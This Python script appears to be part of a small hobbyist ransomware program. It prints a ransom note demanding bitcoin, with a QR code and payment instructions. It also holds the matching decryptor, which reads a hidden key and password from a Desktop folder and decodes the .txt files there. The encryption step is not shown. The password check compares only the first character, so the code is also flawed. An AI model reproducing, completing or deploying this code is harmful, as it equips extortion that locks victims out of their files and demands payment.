#!/usr/bin/python
# -*- coding: utf8 -*-
import os
import argparse
import time
import smtplib

TGREEN = '\033[32m'  # Green Text
TRED = '\033[31m'  # Red Text
TYELLOW = '\033[33m'  # Red Text
ENDC = '\033[m'  # reset to the defaults
# add arg
parser = argparse.ArgumentParser()
parser.add_argument('-i', action="store_true", help='information about us')  # arg for information
parser.add_argument('-d', action="store_true", help='decrypt your files')  # arg for decrypt
args = parser.parse_args()
# Open hide key.txt, take the key and close the file
key_file = open("/Users/" + os.getlogin() + "/Desktop/dossier/.key", "r")
base64 = str(key_file.read())
key_file.close()


# function for decode
def decode(mot):
    mot = mot.replace('=', '')  # replace all '=' by nothing
    car_list = [bin(base64.index(car)) for car in mot]  # replace all element by binary
    list = [element[2:] for element in car_list]  # remove the 0b of element
    list = [element.zfill(6) for element in list]  # add '0' if the element len is not 6
    car_string = ''.join(list)  # change list in string
    car_string = car_string[:(len(car_string) - len(car_string) % 8)]  # Delete many ...
    car_bytes = int(car_string, base=2).to_bytes(len(car_string) // 8, 'big')
    return car_bytes.decode()  # return the decoded string
    pass


# if user use -d
if args.d:
    # Print the locked padlock
    print(
        '\n                         :+shhhys+-\n                      :yMMMMMMMMMMMNy:\n                     `hMMMMNhsooshNMMMMh`\n                    `mMMMN+`      `+NMMMm`\n                    sMMMM-          -MMMMo\n                    hMMMm            NMMMh\n                 `..dMMMm............NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n                  ' + TRED + 'YOUR FILES ARE NOW CRYPTED\n             PLEASE ENTER THE PASSWORD DOWN BELLOW\n' + ENDC)
    # Search the realpassword in the hide save.txt
    file_save = open('/Users/' + os.getlogin() + '/Desktop/dossier/.pass', 'r')
    realpass = str(file_save.read())
    file_save.close()
    password = input('password for decrypte your txt files: ')  # password request
    if password[0] == realpass[0]:  # Verification of the password
        for element in os.listdir("/Users/" + os.getlogin() + "/Desktop/dossier/"):
            if element.endswith('.txt'):
                file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'r')
                newtext = decode(str(file.read()))
                file = open("/Users/" + os.getlogin() + "/Desktop/dossier/" + element, 'w')
                file.write(newtext)
                file.close()
            else:
                pass
        # Print the unlocked padlock
        print(
            '\n                          :+shhhys+-\n                        :yMMMMMMMMMMMNy:\n                      `hMMMMNhsooshNMMMMh`\n                     `mMMMN+`      `+NMMMm`\n                                    -MMMMo\n                                      NMMMh\n                 `....................NMMMh..`\n                ' + TYELLOW + ' dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMNmmMMMMMMMMMMMMd\n                 dMMMMMMMMMM+   `oMMMMMMMMMMd\n                 dMMMMMMMMMN`    `MMMMMMMMMMd\n                 dMMMMMMMMMMm`  `mMMMMMMMMMMd\n                 dMMMMMMMMMMN    NMMMMMMMMMMd\n                 dMMMMMMMMMMd````dMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMd\n                 dMMMMMMMMMMMMMMMMMMMMMMMMMMh\n                 .sdmmmmmmmmmmmmmmmmmmmmmmds`' + ENDC + '\n\n     ' + TGREEN + 'YOUR FILES ARE NOW UNCRYPTED, THANK YOU FOR THE BITCOINS\n  PLEASE GAVE US STARS ON TRUSTPILOT  (434 REVIEWS ' + TYELLOW + '★ ☆ ☆ ☆ ☆' + TGREEN + ' )!\n' + ENDC)
    else:
        print(TRED + 'fail wrong password', ENDC)
# if user use -i
if args.i:
    # Print information with time
    print(
        80 * "=" + "\n           __    __       ___       ______  __  ___  _______  _______  \n          |  |  |  |     /   \     /      ||  |/  / |   ____||       \ \n          |  |__|  |    /  ^  \   |  ,---- |  `  /  |  |__   |  .--.  |\n          |   __   |   /  /_\  \  |  |     |    <   |   __|  |  |  |  |\n          |  |  |  |  /  _____  \ |  `----.|  .  \  |  |____ |  `--`  |\n          |__|  |__| /__/     \__\ \______||__|\__\ |_______||_______/ \n\n" + 80 * "=" + "\n\n • You just got hacked by the H4CK3R™ \n\n • All your files are been encrypted\n\n • For uncrypt your files you must send \n   100$ in btc to the adress below\n" + 80 * "=")
    time.sleep(3)
    print(
        "\n   ▄▄▄▄▄▄▄ ▄ ▄ ▄▄▄▄   ▄▄ ▄▄▄▄▄▄▄\n   █ ▄▄▄ █ ▄██▀▀▀  █ █▄▀ █ ▄▄▄ █\n   █ ███ █ █▀▀▄█ █▀▄██ ▀ █ ███ █\n   █▄▄▄▄▄█ ▄ █▀▄▀▄▀█ █▀▄ █▄▄▄▄▄█              Please send 0.001 BTC\n   ▄▄▄▄  ▄ ▄ █▄█▄ ███▄ ▀▄  ▄▄▄ ▄              To this BTC adress by\n    ▀▀▄██▄▀ ▄█▄██▀▀▄▄▄ ▀█▀▀▀▄▄█▀\n   █▀ ▄█▄▄█▄██ ▄ ▄ █▄ ▄▀▄ ▀▄█▄▀▀\n   █▄▄ █▄▄█ ▄▄█▀▄▀▀█▄▄█▄██  ▄ ▄█\n   ▀ ▀▀█ ▄█▀██▀▄ █▀▄▄█ ▀█▀█ █▄█▀              If you don't know how\n   ▄▀▀█ ▄▄█ ██  ▄█▄ ▄▄ █ ▀▀   █               to get bitcoin? Go to\n    ▄▀▀██▄▄█ █▀ ██▀▀██▀█▄▄████▀█              coinbase.com and sinup\n   ▄▄▄▄▄▄▄ ▀▄▄   ▄ ██ ▄█ ▄ █ █ ▀\n   █ ▄▄▄ █  ▄▄█▀▀▀▄ ▄█ █▄▄▄█ ▄▄ \n   █ ███ █ █▀█▀▄▀▄▀▀ ▀▄ ▀▄█ ▀▀ █\n   █▄▄▄▄▄█ █▀█▄▀▀  █  ▄█ █▄▄▀▄█\n                      \n\n" + 80 * "=")
